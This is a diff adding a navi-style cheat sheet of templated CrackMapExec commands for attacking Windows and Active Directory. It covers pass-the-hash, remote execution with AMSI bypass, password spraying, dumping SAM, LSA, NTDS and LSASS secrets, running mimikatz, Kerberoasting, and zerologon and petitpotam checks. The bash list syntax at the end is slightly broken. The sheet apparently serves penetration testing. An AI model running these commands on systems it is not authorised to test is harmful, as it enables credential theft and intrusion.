@@ -1,0 +1,68 @@
+% crackmapexec
+# Pass the hash
+cme <protocol> <target> -u <username> -H '<(LM:)NT hash>' <localauth>
+
+# execute remote command (cmd)
+crackmapexec <protocol> <target> -u <username> -p <password> -x <command>
+
+# execute remote command (powershell)
+crackmapexec <protocol> <target> -u <username> -p <password> -X <command> <amsibypass> </path/amsi-payload>
+
+# password praying (try all users with all passwords)
+cme <protocol> <target> -u <usernames (space seperated or file)> -p <passwords (space seperated or file)> --continue-on-success
+
+# password stuffing (1 username to 1 password)
+cme <protocol> <target> -u <usernames (space seperated or file)> -p <passwords (space seperated or file)> --no-bruteforce --continue-on-success
+
+% crackmapexec, smb
+# extract the following info from smb share: password policy, users, rid brutforce, groups (local and remote), active sessions, shares, disks or drives, logged on users, check spooler/webdav service is running
+cme smb <target> –u <ValidUser> –p <ValidPass> --<regularmodule>
+
+# (admin user) extract the following info from: smb share sam file, lsa secrets, dump ntds.dit, lsass/nano dump, dump wireless information
+cme smb <target> –u <admin> –p <password> --<adminmodule>
+
+# list hosts that dont require SMB signing on network range
+cme smb <CIDR network> --gen-relay-list
+
+# scan for vulnerabilities
+cme smb <ip> -u <username> -p <password> -M <vuln>
+
+# Spider remote system shares
+cme SMB <IP> -u <username> -p <password> --spider <share>\$ --pattern txt
+
+# download file from remote smb share
+cme smb <target> -u <username> -p <password> --<get>-file <SMB file location> <local location>
+
+# upload file to remote smb share
+cme smb <target> -u <username> -p <password> --put-file <local location> <SMB file location>
+
+# Execute mimikatz
+cme smb <target> -u <username> -p <password> -M mimikatz -o COMMAND=<mimikatz command>
+
+% crackmapexec, ldap
+# ASREPRoast (unauthenticated)
+cme ldap <target> -u <username> -p '' --asrepraost <output file>
+
+# ASREPRoast (authenticated) this will grant all SPN hashes on the domain
+cme ldap <target> -u <username> -p <password> --asrepraost <output file> --kdcHost <domain name>
+
+# Kerberoast
+cme ldap <target> -u <username> -p <password> --kerberoasting <output file>
+
+# check for Unconstrained delegations
+cme ldap <target> -u <username> -p <password> --trusted-for-delegation
+
+# check admins (requires admin)
+cme ldap <target> -u <username> -p <password> --admin-count
+
+# ldap Modules to check machine account quota, get user description, extract network information
+cme ldap <target> -u <username> -p <password> -M <ldapmodules>
+
+
+$ protocol: list=( smb ldap winrm mssql rdp) printf '%s\n' "${list[]@]}" printf '%s\n' "${list[]@]}"
+$ vuln: list=( "zerologo" "petitpotam" "nopac" "spider_plus" ) printf '%s\n' "${list[]@]}"
+$ regularmodule: list=( "pass-pol" "users" "rid-brute" "groups" "sessions" "shares" "disks" "loggedon-users" "local-group" "laps" "spooler" "webdav") printf '%s\n' "${list[]@]}"
+$ adminmodule: list=("sam" "lsa" "ntds" "lsassy" "nanodump" "wireless" ) printf '%s\n' "${list[]@]}"
+$ localauth: list=( "--local-auth" " " ) printf '%s\n' "${list[]@]}"
+$ amsibypass: list=( "--amsi-bypass" " " ) printf '%s\n' "${list[]@]}"
+$ ldapmodules: list=(maq get-desc-users adcs get-network ) printf '%s\n' "${list[]@]}"
